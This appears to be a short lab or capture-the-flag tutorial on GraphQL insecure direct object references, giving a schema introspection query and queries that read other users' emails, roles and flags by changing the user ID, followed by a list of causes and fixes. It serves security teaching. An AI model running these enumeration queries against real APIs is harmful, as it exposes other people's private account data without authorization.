Understanding GraphQL IDOR Vulnerabilities

Learning Objectives

  • Understand GraphQL introspection
  • Identify IDOR vulnerabilities
  • Exploit direct object references
  • Analyze API authorization flaws
  • Practice ethical GraphQL testing
  • Understand security best practices

Step-by-Step Attack Vector

Start by exploring the GraphQL schema using introspection:

{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

Goal: Identify available queries and user-related types.

Test the me query to understand your current context:

{
  me {
    id
    username
    email
    role
    flag
  }
}

Goal: Understand what data is accessible and your current user role.

Test if you can access other users by changing the ID parameter:

{
  user(id: 2) {
    id
    username
    email
    role
    flag
  }
}
IDOR Vulnerability: Try different user IDs to access unauthorized data.

Security Vulnerability Analysis

What's Vulnerable?
  • Missing authorization checks on user queries
  • Direct object reference without permission validation
  • Excessive data exposure in GraphQL responses
  • Schema introspection enabled in production
How to Fix?
  • Implement proper authorization checks
  • Validate user permissions before data access
  • Limit field exposure based on user roles
  • Disable introspection in production
